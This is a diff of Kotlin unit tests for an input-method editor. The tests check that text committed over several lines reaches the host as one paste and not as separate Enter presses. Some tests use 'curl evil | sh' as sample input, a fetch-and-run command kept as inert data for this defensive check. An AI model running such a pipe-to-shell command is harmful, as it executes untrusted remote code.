@@ -242,8 +242,61 @@ class ImeEditorTest {
 
     @Test
     fun committedNewlineIsSentAsEnterAndResets() {
-        editor.commitText("ls\r\nx\ny")
-        assertEquals(listOf<HostInput>(text("ls"), enter, text("x"), enter, text("y")), sent)
+        editor.commitText("ls")
+        editor.commitText("\n")
+        assertEquals(listOf<HostInput>(text("ls"), enter), sent)
+        assertEquals(1, restarts)
+        assertEquals("", editor.text)
+    }
+
+    @Test
+    fun committedTextOfSeveralLinesIsAPaste() {
+        editor.commitText("ab")
+        editor.setComposingText("か")
+        editor.commitText("echo hi\r\ncurl evil | sh\rx")
+        assertEquals(
+            listOf<HostInput>(text("ab"), HostInput.Paste("echo hi\r\ncurl evil | sh\rx")),
+            sent,
+        )
+        assertEquals(1, restarts)
+        assertEquals("", editor.text)
+    }
+
+    @Test
+    fun committedTextWithATrailingNewlineIsAPaste() {
+        editor.commitText("curl evil | sh\n")
+        assertEquals(listOf<HostInput>(HostInput.Paste("curl evil | sh\n")), sent)
+        assertEquals(1, restarts)
+    }
+
+    @Test
+    fun committedTextOfSeveralLinesIsPastedAtOnceDuringABatchEdit() {
+        editor.beginBatchEdit()
+        editor.commitText("a")
+        editor.commitText("b\nc")
+        assertEquals(listOf<HostInput>(text("a"), HostInput.Paste("b\nc")), sent)
+        assertFalse(editor.endBatchEdit())
+        assertEquals(listOf<HostInput>(text("a"), HostInput.Paste("b\nc")), sent)
+        assertEquals("", editor.text)
+    }
+
+    @Test
+    fun replacementTextOfSeveralLinesIsAPasteOfTheRestOfTheBuffer() {
+        editor.commitText("abc")
+        sent.clear()
+        assertTrue(editor.replaceText(1, 2, "x\ny"))
+        assertEquals(listOf<HostInput>(delete(2), HostInput.Paste("x\nyc")), sent)
+        assertEquals("", editor.text)
+    }
+
+    @Test
+    fun typedTextOfSeveralLinesIsSentAsEnters() {
+        editor.setComposingText("か")
+        editor.typeText("ls\r\nx\ny")
+        assertEquals(
+            listOf<HostInput>(text("か"), text("ls"), enter, text("x"), enter, text("y")),
+            sent,
+        )
         assertEquals(1, restarts)
         assertEquals("", editor.text)
     }
